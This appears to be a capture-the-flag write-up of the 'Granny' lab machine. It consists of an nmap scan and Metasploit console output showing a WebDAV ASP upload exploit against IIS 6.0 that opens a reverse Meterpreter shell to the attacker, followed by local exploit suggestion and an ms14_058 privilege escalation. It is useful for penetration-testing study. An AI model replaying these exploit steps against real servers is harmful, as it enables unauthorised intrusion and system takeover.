# Granny

### Nmap

```bash
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT POST
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Date: Sat, 25 Jun 2022 11:30:24 GMT
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   WebDAV type: Unknown
|_  Server Type: Microsoft-IIS/6.0
```

### Exploitation

```
msf6 exploit(windows/iis/iis_webdav_upload_asp) > exploit
[*] Started reverse TCP handler on 10.10.14.19:4444 
[*] Checking /metasploit7004947.asp
[*] Uploading 613937 bytes to /metasploit7004947.txt...
[*] Moving /metasploit7004947.txt to /metasploit7004947.asp...
[*] Executing /metasploit7004947.asp...
[*] Sending stage (175686 bytes) to 10.10.10.15
[*] Deleting /metasploit7004947.asp (this doesn't always work)...
[!] Deletion failed on /metasploit7004947.asp [403 Forbidden]
[*] Meterpreter session 1 opened (10.10.14.19:4444 -> 10.10.10.15:1035) at 2022-06-26 03:55:46 -0400

meterpreter > ps
1932  580   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe

meterpreter > migrate 1932
[*] Migrating from 2356 to 1932...
[*] Migration completed successfully.

msf6 post(multi/recon/local_exploit_suggester) > exploit
[*] 10.10.10.15 - Collecting local exploits for x86/windows...
[*] 10.10.10.15 - 29 exploit checks are being tried...
[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The target service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed

msf6 exploit(windows/local/ms14_058_track_popup_menu) > exploit
[*] Started reverse TCP handler on 10.10.14.19:4444 
[*] Reflectively injecting the exploit DLL and triggering the exploit...
[*] Launching msiexec to host the DLL...
[+] Process 2480 launched.
[*] Reflectively injecting the DLL into 2480...
[*] Sending stage (175686 bytes) to 10.10.10.15
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Meterpreter session 2 opened (10.10.14.19:4444 -> 10.10.10.15:1034) at 2022-06-26 03:16:59 -0400

```
